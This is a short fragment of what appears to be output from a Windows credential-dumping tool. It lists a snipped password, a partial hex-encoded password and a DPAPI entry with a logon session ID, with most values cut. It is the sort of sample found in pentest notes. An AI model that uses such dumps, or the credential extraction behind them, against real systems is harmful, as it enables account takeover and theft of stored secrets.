                password <SNIP>
                password (hex)54006f0074006f007200<SNIP>
        == DPAPI [286b63a7]==
                luid 678126503
<SNIP>

